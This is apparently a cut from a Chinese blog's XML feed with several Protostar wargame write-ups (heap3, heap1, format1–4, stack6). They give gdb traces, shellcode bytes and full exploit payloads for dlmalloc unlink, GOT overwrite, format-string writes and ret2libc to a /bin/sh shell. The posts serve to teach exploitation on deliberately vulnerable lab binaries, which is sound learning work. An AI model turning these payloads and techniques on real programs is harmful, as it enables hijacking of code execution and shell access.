used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 由此可以画出chunk结构示意图(简化)： prev_size存储前一个块的大小，size存储当前块的大小。 块大小将始终是8字节的倍数，用于对齐，这意味着size的3个最低位始终为0。 malloc使用这三个位，最低有效位将指示前一个块是allocated还是free。 调用malloc时，它会初始化prev_size和size，并在之后返回内存的地址（上图中的mem）。已使用的块，会忽略fd和bk，并将其内存用于程序数据。 当一个块是free的时候，它会被存储在双链表结构中，并且fd(forward)包含下一个free chunk的地址，bk(backward)包含前一个free chunk的地址。因此，这些指针覆盖free chunk中的mem的开头八个字节。 大致了解后进gdb看看究竟是怎么回事 (gdb) set disassembly-flavor intel (gdb) set pagination off (gdb) disassemble main Dump of assembler code for function main: 0x08048889 &lt;main+0&gt;: push ebp 0x0804888a &lt;main+1&gt;: mov ebp,esp 0x0804888c &lt;main+3&gt;: and esp,0xfffffff0 0x0804888f &lt;main+6&gt;: sub esp,0x20 0x08048892 &lt;main+9&gt;: mov DWORD PTR [esp],0x20 0x08048899 &lt;main+16&gt;: call 0x8048ff2 &lt;malloc&gt; 0x0804889e &lt;main+21&gt;: mov DWORD PTR [esp+0x14],eax 0x080488a2 &lt;main+25&gt;: mov DWORD PTR [esp],0x20 0x080488a9 &lt;main+32&gt;: call 0x8048ff2 &lt;malloc&gt; 0x080488ae &lt;main+37&gt;: mov DWORD PTR [esp+0x18],eax 0x080488b2 &lt;main+41&gt;: mov DWORD PTR [esp],0x20 0x080488b9 &lt;main+48&gt;: call 0x8048ff2 &lt;malloc&gt; 0x080488be &lt;main+53&gt;: mov DWORD PTR [esp+0x1c],eax 0x080488c2 &lt;main+57&gt;: mov eax,DWORD PTR [ebp+0xc] 0x080488c5 &lt;main+60&gt;: add eax,0x4 0x080488c8 &lt;main+63&gt;: mov eax,DWORD PTR [eax] 0x080488ca &lt;main+65&gt;: mov DWORD PTR [esp+0x4],eax 0x080488ce &lt;main+69&gt;: mov eax,DWORD PTR [esp+0x14] 0x080488d2 &lt;main+73&gt;: mov DWORD PTR [esp],eax 0x080488d5 &lt;main+76&gt;: call 0x8048750 &lt;strcpy@plt&gt; 0x080488da &lt;main+81&gt;: mov eax,DWORD PTR [ebp+0xc] 0x080488dd &lt;main+84&gt;: add eax,0x8 0x080488e0 &lt;main+87&gt;: mov eax,DWORD PTR [eax] 0x080488e2 &lt;main+89&gt;: mov DWORD PTR [esp+0x4],eax 0x080488e6 &lt;main+93&gt;: mov eax,DWORD PTR [esp+0x18] 0x080488ea &lt;main+97&gt;: mov DWORD PTR [esp],eax 0x080488ed &lt;main+100&gt;: call 0x8048750 &lt;strcpy@plt&gt; 0x080488f2 &lt;main+105&gt;: mov eax,DWORD PTR [ebp+0xc] 0x080488f5 &lt;main+108&gt;: add eax,0xc 0x080488f8 &lt;main+111&gt;: mov eax,DWORD PTR [eax] 0x080488fa &lt;main+113&gt;: mov DWORD PTR [esp+0x4],eax 0x080488fe &lt;main+117&gt;: mov eax,DWORD PTR [esp+0x1c] 0x08048902 &lt;main+121&gt;: mov DWORD PTR [esp],eax 0x08048905 &lt;main+124&gt;: call 0x8048750 &lt;strcpy@plt&gt; 0x0804890a &lt;main+129&gt;: mov eax,DWORD PTR [esp+0x1c] 0x0804890e &lt;main+133&gt;: mov DWORD PTR [esp],eax 0x08048911 &lt;main+136&gt;: call 0x8049824 &lt;free&gt; 0x08048916 &lt;main+141&gt;: mov eax,DWORD PTR [esp+0x18] 0x0804891a &lt;main+145&gt;: mov DWORD PTR [esp],eax 0x0804891d &lt;main+148&gt;: call 0x8049824 &lt;free&gt; 0x08048922 &lt;main+153&gt;: mov eax,DWORD PTR [esp+0x14] 0x08048926 &lt;main+157&gt;: mov DWORD PTR [esp],eax 0x08048929 &lt;main+160&gt;: call 0x8049824 &lt;free&gt; 0x0804892e &lt;main+165&gt;: mov DWORD PTR [esp],0x804ac27 0x08048935 &lt;main+172&gt;: call 0x8048790 &lt;puts@plt&gt; 0x0804893a &lt;main+177&gt;: leave 0x0804893b &lt;main+178&gt;: ret End of assembler dump. (gdb) b *0x080488be Breakpoint 1 at 0x80488be: file heap3/heap3.c, line 18. (gdb) b *0x080488f2 Breakpoint 2 at 0x804880a: file heap3/heap3.c, line 22. (gdb) b *0x0804892e Breakpoint 3 at 0x804892e: file heap3/heap3.c, line 28. 分别在第三个malloc后，strcpy后，第三个free后下断点。 找到heap地址0x804c00 查看堆，每个颜色代表一个chunk，可以看到chunk的结构和上面的示意图一样。我们在size字段中看到0x29，则当前块的大小为40（0x28），并且前一个块正在使用中。一切都符合预期，继续。 三个free运行后，意料之外的情况发生了，chunk被free之后，fd被正确设置了，但是bk貌似没有被设置，而且后两个0x29应该变成0x28来指示前面的chunk是free的状态才对。哪里出了问题呢？ Fastbins /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn&apos;t much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ 摘自malloc.c 当块的大小不足80字节时，malloc将使用简化的数据结构(fastbins)并且忽略掉prev_size、bk和prev_inuse位。所以fastbins是采用单链表的形式链接的，这点不同于其他bins。 因此我们构造的chunk的大小必须要大于fastbins所规定的最大值，让malloc把我们构造的chunk不视为fastbins，才能利用free中的unlink漏洞。 Free当free一个chunk时，如果存在与这个chunk相邻的free chunk，则free将它们合并为更大的free chunk，存储在双链表中。 free函数的数据定义 123456789101112131415161718 /* consolidate backward */ //向前合并if (!prev_inuse(p)) &#123; //判断前一个块是否为free块prevsize = p-&gt;prev_size; //当前块的前一个块大小赋值给prevsizesize += prevsize; //自身大小加上前一个块的大小p = chunk_at_offset(p, -((long) prevsize)); //指向当前块的p指针指向前一个块unlink(p, bck, fwd); //unlink当前块(刚才块前面的那个块) &#125;if (nextchunk != av-&gt;top) &#123; //判断下一个块是否为top_chunk(边界判定) /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //取当前块的下下个块的prev_inuse位，以此判断下一个块是不是free块/* consolidate forward */ //向后合并if (!nextinuse) &#123; //判断下一个块是否为free块unlink(nextchunk, bck, fwd); //unlink后一个块size += nextsize; //当前块大小加上后一个块大小 &#125; else //若下一个块不是free块clear_inuse_bit_at_offset(nextchunk, 0); //将下一个块的prev_inuse位置零 以上是向前和向后合并的代码。结合注释可以很容易理解向前向后合并的操作。 1234567891011121314151617181920212223242526272829 /*Place the chunk in unsorted chunk list. Chunks arenot placed into regular bins until after they havebeen given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size))&#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL;&#125; bck-&gt;fd = p; fwd-&gt;bk = p; //将当前chunk插入unsorted bin的第一个和第二个chunk之间。 set_head(p, size | PREV_INUSE); //设置当前chunk的size字段将前一个chunk标记为已使用。 set_foot(p, size); //修改后一个chunk的prev_size字段，设置为当前chunk的size。 check_free_chunk(av, p); &#125;/* Set size/use field */#define set_head(p, s) ((p)-&gt;size = (s))/* Set size at footer (only when chunk is not in use) */#define set_foot(p, s) (((mchunkptr)((char*)(p) + (s)))-&gt;prev_size = (s)) 合并完成后就要将所合并的块放入unsorted bin中去并且进一步完善刚才合并的块(和本题没什么关系，但还是提一下) 然后再来看unlink(简化) 123456#define unlink(P, BK, FD) &#123; FD = P-&gt;fd; BK = P-&gt;bk; FD-&gt;bk = BK; BK-&gt;fd = FD; &#125; 前面说了free块是存储在双链表结构中的，unlilnk的工作就是将free块从这个结构中取出来。在unlink中有两个临时指针变量FD和BK。示意图如下： 所以unlink可以解释为：将p-&gt;bk的值写入地址为(p-&gt;fd)+12的内存，将p-&gt;fd的值写入地址为(p-&gt;bk)+8的内存。 重点来了，如果我们可以控制p-&gt;bk和p-&gt;fd的值，理论上就可以覆盖任何内存了。所以我们可以考虑将fd覆盖为printf(题目中的最后一个函数)的got表项，将bk覆盖为我们放置shellcode的地址(heap中的某一处)，shellcode用来帮我们call winner()，注意：got地址要先减去12来抵消赋值时的+12，除非shellcode超级短(≤8字节)，实际shellcode地址最好安放在表面shellcode地址(p-&gt;bk)+8之后，以免被free时的数据覆盖。 暂停一下，现在整理一下思路。结合前面的铺垫，先想一想我们现在能干什么。 首先我们需要构造两个chunk，一个chunk_A用来放置我们的got和shellcode地址；一个chunk_B大小超过fastbins，通过free掉chunk_B来触发chunk_A的unlink。 要触发chunk_A的unlink有两个条件。首先，A、B必须相邻，其次，A必须被malloc视为free chunk。那么一个很简单的思路就是将B放在A后面，然后将B的prev_inuse位置零，利用向前合并中的unlink达到我们的目的。下面是示意图。 因为chunk_B(蓝框)大于fastbins，所以需要有prev_size位，我们将其设置为0x10以指示前一个块的大小为16字节，同时设置chunk_B的大小为0x64，其最低位为0，以指示前一个块为free状态。接着再依次设置chunk_A(红框)的size、fd和bk。这样看上去就可行了，但是实际上呢？ 由于有的内存需要被0x00这种数据覆盖(比如0x00000011)也就是说我们的payload里面要出现0x00这种数据，而这是不可能实现的，因为strcpy在复制字符串时遇到空字符(0x00)会认为已经复制到了串尾于是停止复制。如果试图用非空字符串填充则会导致chunk_size太大，不仅不方便放置payload而且也没有那么多可用内存。所以貌似无论是B在A后面还是A在B后面都无法摆脱空字符这个问题。 用什么办法才能绕过空字符呢？ Negative Chunk Size12/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s))) 可以看到，在free中得到nextchunk的位置的方法仅仅是用当前chunk的指针直接加上当前chunk的大小。 所以，如果一个chunk的大小是-4会怎么样？ 1#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA) malloc在确定chunk的大小时，会将size数据类型视为unsigned int，所以-4(0xfffffffc)远大于fastbins规定大小，所以就不会被视为fastbins。 注意到最后两bit，prev_inuse和is_mmapped都为0，所以他的前一个chunk会被视为free chunk。 这个块的前一个块地址为当前块起始地址-(-4)，也就是+4。后一个块的地址为当前块起始地址+(-4)，也就是-4。 于是现在可以构造一个这样的chunk_A： 红框为chunk_A，其size和prev_size都是-4。将chunk_A放在chunk_B后面，当free掉chunk_B时，会检查chunk_A是否为free chunk，所以要检查chunk_A的next chunk(蓝框)的prev_inuse位，而next chunk的size正好是chunk_A的prev_size，就是0xfffffffc，所以，正好，prev_inuse位为0，意味着chunk_A是free chunk！ ok，现在思路完整了。 Exploit! 这是最终我们期望heap的内容，说一下为什么shellcode的地址不选在第一个chunk的开始(0x804c008)，因为题目中free调用了三次，所以当最后一个free调用时(第一个块被free时)，data部分前八字节会被其他数据覆盖，因此选择在后面一点(0x804c014)安放shellcode。 先找到got(0x804b128)和winner(0x8048864)，别忘了前面说过的got要减12！所以是0x804b11c 然后在线汇编一下，拿到shellcode \xB8\x64\x88\x04\x08\xFF\xD0 网址：https://defuse.ca/online-x86-assembler.htm#disassembly user@protostar:/tmp$ echo -en &quot;AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot; &gt; AA user@protostar:/tmp$ echo -ne &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65&quot; &gt; BB user@protostar:/tmp$ echo -ne &quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08&quot; &gt; CC 构造payload 和预期一样 pwn！( ͡° ͜ʖ ͡°)✧ 参考：https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x14-heap1]]></title>
    <url>%2F2018%2F10%2F23%2FLiveoverflow-0x14-heap1%2F</url>
    <content type="text"><![CDATA[进入新一部分的学习，heap(堆) heap1，简单的利用strcpy溢出+覆写。 Protostar Heap1AboutThis level takes a look at code flow hijacking in data overwrite cases. This level is at /opt/protostar/bin/heap1 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct internet &#123; int priority; char *name;&#125;;void winner()&#123; printf("and we have a winner @ %d\n", time(NULL));&#125;int main(int argc, char **argv)&#123; struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf("and that's a wrap folks!\n");&#125; 分析第一次接触堆类型题目肯定要先知道堆是什么，heap和stack都是存放数据的地方，简单来说，stack是系统自动分配变量或者调用函数需要用到的的空间，heap则是你自己开辟的空间(比如用malloc之类的函数开辟空间)，同时也需要手动释放空间(free)，分配方式类似于链表。stack的地址由高向低生长，相反，heap的地址是由低向高生长。 Heap is used in C programs for dynamic memory management. libc provides an easy to use interface (malloc/free) to allocate and de-allocate memory regions. The version of libc in Protostar uses an implementation of malloc called dlmalloc, after the name of it’s original creator, Doug Lea. The control structures used by malloc are stored in-band with the data, which allows manipulation of the control structures when heap buffer overflow is possible, as above. 干说不如实干，进gdb看一眼就明白了。 先找到heap起始地址0x804a000，再打印出来，一目了然。和题目源码对照，红框是结构体指针i1所指的区域，蓝框就是结构体指针i2所指的区域。1和2就是源码对应赋值的1和2。黄框和绿框则分别是malloc(8)新开辟空间的起始地址。 了解了大概是怎么回事之后再回去看题目，运行winner()就算过关。二话不说，利用strcpy的溢出，实现write anything anywhere 思路覆盖掉题中最后一个函数printf的GOT表项，改写为winner的地址，实现跳转。 首先找到printf的GOT和winner地址分别是0x8049774(GOT)和0x8048494(winner) 构造第一个参数，使其将第二张图中的绿框位置覆盖为printf的GOT项。构造第二个参数，为winner的地址。 user@protostar:/tmp$ echo -ne &quot;AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08&quot; &gt; heap1A user@protostar:/tmp$ echo -ne &quot;\x94\x84\x04\x08&quot; &gt; heap1B 成功:p]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x13-format4]]></title>
    <url>%2F2018%2F10%2F17%2FLiveoverflow-0x13-format4%2F</url>
    <content type="text"><![CDATA[format4， 运用了PLT和GOT的相关知识 这次的format4再加到前面的1-3后面有点太长了，不好翻，所以新开一篇，也因为这次用到了一些新的方法。 视频链接：http://liveoverflow.com/binary_hacking/ Protostar Format4About%p format4 looks at one method of redirection in a process Hints objdump -TR is your friendThis level is at /opt/protostar/bin/format4 12345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void hello()&#123; printf("code execution redirected! you win\n"); _exit(1);&#125;void vuln()&#123; char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); exit(1); &#125;int main(int argc, char **argv)&#123; vuln();&#125; PLT&amp;GOT简单介绍PLT 进程连接表(Procedure Linkage Table) GOT 全局偏移表(Global Offset Table) 在程序的编译期间，程序本身并不知道不知道诸如puts，exit等等外部函数的地址，所以就创造了一个“跳板”函数，程序先call一个已知的地址，也就是plt，它指向了got，got再通过调用_dl_runtime_resolve将真正的函数地址写进got表中同时调用这个函数，之后再调用这个函数就可以直接使用got表中的地址了。不过真正的情况远没有这么简单。 就拿format4的exit()举个例子吧 先找到了exit在plt中的地址0x80483ec，紧接着就跳转到了got中，got中的跳转地址就是plt的下一条指令(push 0x30)，plt最后一条指令jmp 0x804837c则是跳转到了plt的表头，用于执行_dl_runtime_resolve，这个函数才将真正的exit的地址写进0x8049724中。 在执行_dl_runtime_resolve后可以看到got中对应的值已经从开始的0x080483f2变为了真正的exit的地址0xb7ec60c0 i proc mapping看一下，地址确实是位于libc库中，说明整个过程没问题。 示意图如下 参考： https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html https://www.jianshu.com/p/0ac63c3744dd 分析了解了plt和got之后分析一下源码，同样是利用printf进行对栈的覆写，但是vuln()最后有一个exit()，也就是该函数不返回，所以覆写return地址这个办法就不行了。但是我们可以利用刚才提到的PLT和GOT，也就是将exit()的地址覆写为hello()地址。 思路既然要把exit()的地址覆写为hello()地址，那就要先找到这两个地址 (gdb) p hello $1 = {void (void)} 0x80484b4 &lt;hello&gt; 通过前面我们知道，只要把0x8049724覆盖，就能成功跳转了。 开始找偏移 user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;AAAA&quot;+&quot;%x&quot;*4&apos; | ./format4 AAAA200b7fd8420bffff61441414141 覆写地址的时候如法炮制format3的办法就行了，利用高位溢出。 覆写的顺序是 0xb4 0x84 0x04 0x08 0xb4 - 0x10(开始的4个地址占了4*4=0x10个字节，所以减去) = 0xa4 = 164 0x184(0x84小于0xb4所以补一位) - 0xb4 = 208 0x204(同理，不足，补位) - 0x184 = 128 0x208 - 0x204 = 4 最后的payload user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08%164c%4$n%208c%5$n%128c%6$n%4c%7$n&quot;&apos; | ./format4 $%&amp;&apos; $ code execution redirected! you win 小结一开始遇到这种类型的题目有点摸不着头脑，但是只要想通了就很好理解。多做简单的题找找感觉，后面的题就可以举一反三了。]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x11-format1~3]]></title>
    <url>%2F2018%2F10%2F09%2FLiveoverflow-0x11-format1-3%2F</url>
    <content type="text"><![CDATA[开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。 视频链接：http://liveoverflow.com/binary_hacking/ Protostar Format1AboutThis level shows how format strings can be used to modify arbitrary memory locations. Hints objdump -t is your friend, and your input string lies far up the stack :) This level is at /opt/protostar/bin/format1 1234567891011121314151617181920#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string)&#123; printf(string); if(target) &#123; printf("you have modified the target :)\n"); &#125;&#125;int main(int argc, char **argv)&#123; vuln(argv[1]);&#125; 分析先运行一下，运行时带上字符串参数，程序就会原样的将字符串打印出来，这也是预料之内的事。但是有一个问题，我们可以控制的是printf里的哪个参数？man printf看一下 再看一眼源码，显然我们控制的是第一个format string(格式化字符串)，这就意味着我们可以在要打印字符串里面加上一些格式化输出，比如%d，%x等。那就先试试%d，%x能打印出什么。%d打印的东西看不出什么蹊跷，但是%x打印的东西就非常熟悉了，经过前面几章的学习可以很容易联想到是栈地址。但是为什么会打印一些看似随机的地址？ 由于我们只控制了printf的第一个参数，而且也没有第二个参数，所以printf找不到需要被打印的内容的地址，所以就只有在栈里面随机找地址打印里面的内容。 嗯，，然后呢？知道了这些信息有什么用？ man 3 printf看看有什么可用的信息。可以看到，手册里提醒我们如果printf里包含%n则可能造成安全隐患。 意思是参数必须是一个整型指针，并且会把%n前面打印的所有字符个数写入这个地址。 写个小程序测试一下1234567#include&lt;stdio.h&gt;int main()&#123; int a; printf("abcd %n\n", &amp;a); printf("a = %d\n", a);&#125; 空格也算在内，没毛病 思路再回顾一下题目，所以现在肯定是用%n将target的值覆盖掉。 先找到target的地址 objdump -t ./format1 | grep “target” 然后试着多打印点栈里的值后面一直重复出现的25782e其实就是 %x. 的ascii码，这样就有一个明确的思路了。如下图 printf找到我们输入的第一个%x之后会在栈中随机找个地址打印其内容，后面的%x也就跟着打印前面那个地址后面的内容，直到%x的数量足够多时，后面的%x开始打印前面%x.的信息，也就是刚刚看到的25782e。如果我们把其中的一个%x改成%n会发生什么？ 假设上图的%x(红框2)改成了%n，显然，这时printf会将红框1内的数据也就是252e7825(%x.%)当作一个地址，然后将前面打印的所有字符个数都写入这个地址中去，所以我们要做的就是构造字符串，将红框1的内容写成target的地址，再将红框2改成%n进行写入。%n的位置就只有一步步试出来了。 可以看到在几次尝试过程中不断地修改a的个数就是为了数据能够对齐。 多次尝试后成功修改target的值。 2018/10/12更新 Protostar Format2 12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln()&#123; char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); if(target == 64) &#123; printf("you have modified the target :)\n"); &#125; else &#123; printf("target is %d :(\n", target); &#125;&#125;int main(int argc, char **argv)&#123; vuln();&#125; format2和1差不多，只不过规定了target的值为64。 找地址 user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;%x &apos;*100&quot; | ./format2 200 b7fd8420 bffff624 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7e9000a b7ffb71c bffff734 b7fffbe8 e b7ea36e4 b7fe1afc f63d4e2e 0 3 b7fff8f8 0 0 1 892 b7fe1b28 b7fe1848 8048285 b7ea3f14 80481f4 1 b7ffeff4 target is 0 :( 找偏移 user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x&apos;*4&quot; | ./format2 AAAA200b7fd8420bffff62441414141 target is 0 :( 200b7fd8420bffff624有19个字节，64-19-4=41，减4是因为target的地址占了四个字节，虽然这四个字节是不可打印的，但是%n还是要把它们算在里面，所以还要构造41个字节 user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;\xe4\x96\x04\x08&apos;+&apos;A&apos;*41+&apos;%x&apos;*3+&apos;%n&apos;&quot; | ./format2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd8420bffff624 you have modified the target :) 成功修改 2018/10/13更新 Protostar Format3 12345678910111213141516171819202122232425262728293031#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void printbuffer(char *string)&#123; printf(string);&#125;void vuln()&#123; char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printbuffer(buffer); if(target == 0x01025544) &#123; printf("you have modified the target :)\n"); &#125; else &#123; printf("target is %08x :(\n", target); &#125;&#125;int main(int argc, char **argv)&#123; vuln();&#125; 这次题目要求将target覆盖为0x01025544，而%n一次只能写入一个字节，所以可以分多次写入。 user@protostar:/opt/protostar/bin$ objdump -t ./format3 | grep &quot;target&quot; 080496f4 g O .bss 00000004 target 找地址 user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x &apos;*15&quot; | ./format3 AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141 25207825 78252078 20782520 target is 00000000 :( 找偏移，多了三个，减去 user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x&apos;*12&quot; | ./format3 AAAA0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff61441414141 target is 00000000 :( 偏移为12 user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%12$n%13$n%14$n%15$n&quot;&apos; | ./format3 ▒ target is 10101010 :( 由于要覆盖的值是0x01025544，所以覆盖的顺序是0x44，0x55，0x02，0x01 看到target已经是0x10，所以第一个padding的长度就是0x44-0x10=0x34=52 第二个padding同理 0x55-0x44=0x11=17 到了第三个padding，发现要写入0x02，但是前面的长度明显大于2，所以要利用进位。0x102-0x55=0xad=173 最后一个也同理，0x201-0x102=0xff=255 user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%52c%12$n%17c%13$n%173c%14$n%255c%15$n&quot;&apos; | ./format3 ▒ ▒ you have modified the target :) 最后一步%52c%12$n中%52c意思是填充52个字节，%12$n是在第12个偏移出写入 具体可以参考维基]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x0F-ret2libc]]></title>
    <url>%2F2018%2F10%2F05%2FLiveoverflow-0x0F-ret2libc%2F</url>
    <content type="text"><![CDATA[接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。 同样翻来覆去看了很多遍，可能比上个视频看的次数还多，但是一直没理解透彻，这两天又拿出来看了几遍，不知道为什么就豁然开朗了，，，赶紧趁热写进博客。 视频链接：http://liveoverflow.com/binary_hacking/ 题目 Protostar Stack6AboutStack6 looks at what happens when you have restrictions on the return address. This level can be done in a couple of ways, such as finding the duplicate of the playload (odjdump -s will help with this), or ret2libc, or even return orientated programming. It is strongly suggested you experiment with multiple ways of getting your code to execute here. This level is at /opt/protostar/bin/stack6 1234567891011121314151617181920212223#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath()&#123; char buffer[64]; unsigned int ret; printf("input path please: "); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1); &#125; printf("got path %s\n", buffer);&#125;int main(int argc, char **argv)&#123; getpath();&#125; 分析同样，先看源码。发现和stack5差不多，只不过多了下面这些东西。 12345ret = __builtin_return_address(0);if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1); &#125; __builtin_return_address()作用是获取当前函数的返回地址，配合下面的if语句，这段代码想表达的就是：检查当前函数返回地址，如果是0xbf开头，就强制退出，否则就继续执行下面的代码。 以0xbf开头的地址？是什么意思呢？打开gdb看一下 被安排的明明白白，所有0xbf开头的地址都是栈。在stack5中，我们通过控制返回地址把eip返回到栈中，以此来执行我们的shellcode，如果我们现在仍然把返回地址修改到栈里就会被exit()终止程序，shellcode也不可能得到执行了。 题目也说了有很多办法可以解决这个问题，你可以直接将返回地址覆盖为ret这个命令本身所在的地址，也就是当ret执行后，它返回的目的地是ret本身。这就相当于把栈中的返回地址pop出来，结果下一个命令还是ret，于是刚才返回地址的后面一个地址才变成了真正的返回地址，你可以随意操控这个地址，指向栈中也没有关系，因为刚刚的第一个ret已经绕过了if语句的检查，后面的操作就和stack5没什么区别了，本篇文章主要讲ret2libc，所以这里就不细讲这个方法了。 还有一个方法就是ret2libc，其实全称就是return to libc，顾名思义：返回到libc 这篇文章很值得参考链接：https://www.shellblade.net/docs/ret2libc.pdf 思路在说思路之前先做一些铺垫，libc其实是linux下的ansi c函数库，说白了，ret2libc就是返回到libc中的某个函数，我们选择system函数，因为system可以让我们执行shell command。光是返回到system没有什么用，我们要用它帮我们执行一些命令，当然是/bin/sh了，这样我们直接就拿到shell了。 现在我们有了一个大致思路，就是将返回地址覆盖为system的地址，然后将/bin/sh的地址作为参数传给system。但是一个新的问题出现了，返回地址被system地址覆盖后，要把/bin/sh放在哪儿，才能保证system接收到这个参数？ 先看一个例子 写一小段程序，看看是怎么传参的 12345678910#include&lt;stdio.h&gt;void foo(int x)&#123; x++;&#125;int main()&#123; foo(2); return 0;&#125; 放到gdb里面看 可以看到在调用foo()之前已经将参数压入栈顶，然后在调用foo()时会把返回值也压入栈中，foo函数也有自己的栈帧，所以紧接着的命令就是push ebp，最后栈就变成了这个样子： 可见,原来的ebp(红框)，返回地址(蓝框)，参数(绿框)依次排列在栈中，参数的位置就是ebp+0x8，这只是传了一个参数的函数，多个参数就以此类推，ebp+0xc，ebp+0x10。就算是libc中的system函数也不例外，system只接收一个参数，所以可以确定/bin/sh放置的位置就是ebp+0x8 下面是思路 所以现在只需要找到system和/bin/sh的地址就行了 system的地址 (gdb)i proc mapping可以找到libc的地址因为/bin/sh在libc中，所以只需要找到/bin/sh的偏移地址再把两个地址相加就是/bin/sh的地址了 用下面的命令找到/bin/sh偏移地址验证一下，没问题 可以开始写脚本了 123456import structpadding = "A"*4*20system = struct.pack("I", 0xb7ecffb0)return_after_system = "AAAA"bin_sh = struct.pack("I", 0xb7fb63bf)print padding + system + return_after_system + bin_sh 运行成功;)]]></content>
      <tags>
        <tag>Binary-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liveoverflow-0x0E-Shellcode]]></title>
    <url>%2F2018%2F10%2F03%2FLiveoverflow-0x0E-Shellcode%2F</url>
